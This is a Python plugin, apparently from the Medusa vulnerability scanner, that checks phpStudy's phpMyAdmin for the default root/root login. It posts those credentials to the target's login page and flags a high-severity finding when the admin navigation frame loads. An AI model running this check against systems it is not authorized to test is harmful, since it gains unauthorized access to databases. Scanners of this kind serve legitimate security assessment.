#!/usr/bin/env python
# -*- coding: utf-8 -*-

import urllib
import requests
import logging
import ClassCongregation
class VulnerabilityInfo(object):
    def __init__(self,Medusa):
        self.info = {}
        self.info['author'] = "Ascotbe"  # 插件作者
        self.info['create_date'] = "2019-10-13"  # 插件编辑时间
        self.info['algroup'] = "Phpstudy_PhpmyadminDefaultpwd"  # 插件名称
        self.info['name'] ='phpstudy_phpmyadmin默认密码漏洞' #漏洞名称
        self.info['affects'] = "phpStudy"  # 漏洞组件
        self.info['desc_content'] = ""  # 漏洞描述
        self.info['rank'] = "高危"  # 漏洞等级
        self.info['suggest'] = "尽快升级最新系统"  # 修复建议
        self.info['details'] = Medusa  # 结果
def UrlProcessing(url):
    if url.startswith("http"):#判断是否有http头，如果没有就在下面加入
        res = urllib.parse.urlparse(url)
    else:
        res = urllib.parse.urlparse('http://%s' % url)
    return res.scheme, res.hostname, res.port

payload="/phpmyadmin/index.php"
post_data = {
    "pma_username": "root",
    "pma_password": "root",
    "server": "1",
    "target": "index.php"
}
def medusa(Url,RandomAgent,ProxyIp):

    scheme, url, port = UrlProcessing(Url)
    if port is None and scheme == 'https':
        port = 443
    elif port is None and scheme == 'http':
        port = 80
    else:
        port = port
    global resp
    global resp2
    try:
        payload_url = scheme+"://"+url+payload
        headers = {
            'Accept-Encoding': 'gzip, deflate',
            'Accept': '*/*',
            "Content-Type": "application/x-www-form-urlencoded",
            'User-Agent': RandomAgent,
        }
        s = requests.session()
        if ProxyIp!=None:
            proxies = {
                # "http": "http://" + str(ProxyIps) , # 使用代理前面一定要加http://或者https://
                "http": "http://" + str(ProxyIp)
            }
            resp = s.post(payload_url, data=post_data, headers=headers, proxies=proxies, timeout=5, verify=False)
            resp2 = s.get(payload_url, headers=headers, proxies=proxies, timeout=5, verify=False)
        elif ProxyIp==None:
            resp = s.post(payload_url, data=post_data,headers=headers, timeout=5, verify=False)
            resp2 = s.get(payload_url, headers=headers, timeout=5, verify=False)
        con = resp.text
        con2 = resp2.text
        if con2.lower().find('navigation.php')!=-1 and con.lower().find('frame_navigation')!=-1:
            Medusa = "{} \r\n漏洞详情:\r\nPayload:{}\r\nPost:{}\r\n".format(url, payload_url,post_data)
            _t = VulnerabilityInfo(Medusa)
            web = ClassCongregation.VulnerabilityDetails(_t.info)
            web.High()  # serious表示严重，High表示高危，Intermediate表示中危，Low表示低危
            return (_t.info)
    except:
        logging.warning(Url)
        _ = VulnerabilityInfo('')
        logging.warning(_.info.get('parameter'))